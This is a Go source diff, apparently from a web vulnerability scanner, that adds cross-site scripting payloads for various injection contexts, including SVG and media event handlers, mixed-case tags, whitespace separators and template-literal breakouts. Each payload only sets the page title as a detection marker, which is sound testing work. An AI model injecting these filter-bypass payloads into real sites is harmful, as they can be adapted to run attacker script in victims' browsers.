@@ -516,12 +516,20 @@ func xssBrowserPayloads() []string {
 		`</style><svg onload="top.document.title='%s'">`,
 		`--><svg onload="top.document.title='%s'">`,
 		`<iframe srcdoc="<svg onload=top.document.title='%s'>"></iframe>`,
+		`<iframe srcdoc="&lt;svg onload=&quot;top.document.title='%s'&quot;&gt;"></iframe>`,
 		`<video><source onerror="top.document.title='%s'">`,
+		`<audio src=x onerror="top.document.title='%s'">`,
+		`<svg><animate attributeName=x dur=1s onbegin="top.document.title='%s'"></animate></svg>`,
+		`<svg><set attributeName=x to=y onbegin="top.document.title='%s'"></set></svg>`,
+		`<sVg/oNloAd="top.document.title='%s'">`,
+		"<svg\tonload=\"top.document.title='%s'\">",
+		"<svg\nonload=\"top.document.title='%s'\">",
 		// JavaScript string/expression/template contexts.
 		`";top.document.title='%s';//`,
 		"${top.document.title='%s'}",
 		`;top.document.title='%s';//`,
 		"`;top.document.title='%s';//",
+		"${(top.document.title='%s')}",
 		// URL attributes; the browser confirmer activates javascript: links.
 		`javascript:top.document.title='%s'`,
 		// Raw-text/script breakouts.
@@ -554,7 +562,12 @@ func xssBrowserPayloadsForAnalysis(a *ReflectionAnalysis) []string {
 			svg,
 			`<details open ontoggle="top.document.title='%s'">`,
 			`<video><source onerror="top.document.title='%s'">`,
+			`<audio src=x onerror="top.document.title='%s'">`,
+			`<svg><animate attributeName=x dur=1s onbegin="top.document.title='%s'"></animate></svg>`,
+			`<sVg/oNloAd="top.document.title='%s'">`,
 			`<input autofocus onfocus="top.document.title='%s'">`,
+			`<textarea autofocus onfocus="top.document.title='%s'"></textarea>`,
+			`<iframe srcdoc="&lt;svg onload=&quot;top.document.title='%s'&quot;&gt;"></iframe>`,
 			`</script><script>top.document.title='%s'</script>`,
 		}
 	case CtxQuotedAttr, CtxURL:
@@ -566,9 +579,15 @@ func xssBrowserPayloadsForAnalysis(a *ReflectionAnalysis) []string {
 		} else {
 			out = append(out, doubleBreak, `" autofocus onfocus="top.document.title='%s'" x="`)
 		}
-		out = append(out, `"><svg onload="top.document.title='%s'">`, `</script><script>top.document.title='%s'</script>`)
+		out = append(out, `"><svg onload="top.document.title='%s'">`,
+			`"><details open ontoggle="top.document.title='%s'">`,
+			`"><sVg/oNloAd="top.document.title='%s'">`,
+			`</script><script>top.document.title='%s'</script>`)
 	case CtxUnquotedAttr:
-		out = []string{` autofocus onfocus="top.document.title='%s'" x=`, `><svg onload="top.document.title='%s'">`, `><img src=x onerror="top.document.title='%s'">`}
+		out = []string{` autofocus onfocus="top.document.title='%s'" x=`,
+			` tabindex=1 onfocus="top.document.title='%s'" autofocus x=`,
+			`><svg onload="top.document.title='%s'">`, `><img src=x onerror="top.document.title='%s'">`,
+			`><details open ontoggle="top.document.title='%s'">`}
 	case CtxEventHandler, CtxJSString:
 		if a.JSQuote == '\'' {
 			out = []string{`';top.document.title='%s';//`, `');top.document.title='%s';//`}
@@ -576,7 +595,7 @@ func xssBrowserPayloadsForAnalysis(a *ReflectionAnalysis) []string {
 				out = append([]string{`\';top.document.title='%s';//`}, out...)
 			}
 		} else if a.JSQuote == '`' {
-			out = []string{"`;top.document.title='%s';//", "${top.document.title='%s'}"}
+			out = []string{"`;top.document.title='%s';//", "${top.document.title='%s'}", "${(top.document.title='%s')}"}
 			if strings.Contains(a.Escaped, "`") && strings.Contains(a.Surviving, `\`) {
 				out = append([]string{"\\`;top.document.title='%s';//"}, out...)
 			}
@@ -609,6 +628,8 @@ func xssBrowserPayloadsForAnalysis(a *ReflectionAnalysis) []string {
 	case CtxSrcDoc:
 		out = []string{
 			`&lt;svg onload=&quot;top.document.title='%s'&quot;&gt;`,
+			`&lt;img src=x onerror=&quot;top.document.title='%s'&quot;&gt;`,
+			`&lt;details open ontoggle=&quot;top.document.title='%s'&quot;&gt;`,
 			clean,
 		}
 		if a.Quote == '\'' {
